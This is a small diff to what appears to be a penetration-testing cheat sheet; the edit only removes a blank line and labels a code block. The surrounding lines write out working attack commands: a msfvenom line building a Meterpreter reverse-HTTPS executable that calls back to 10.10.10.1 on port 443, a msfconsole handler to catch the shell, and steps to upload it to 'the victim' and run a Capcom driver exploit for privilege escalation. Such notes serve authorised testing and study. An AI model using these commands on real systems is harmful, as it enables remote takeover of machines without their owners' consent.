@@ -1507,12 +1507,11 @@ cat drivers.txt | Select-String -pattern Capcom
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f exe -o revshell.exe
 sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.10.1; set LPORT 443; set EXITONSESSION false; set EXITFUNC thread; run -j"
-
 ```
 
 then upload revshell.exe to the victim and : 
 
-```
+```text
 mv revshell.exe C:\ProgramData\revshell.exe 
  .\ExploitCapcom.exe
 ```
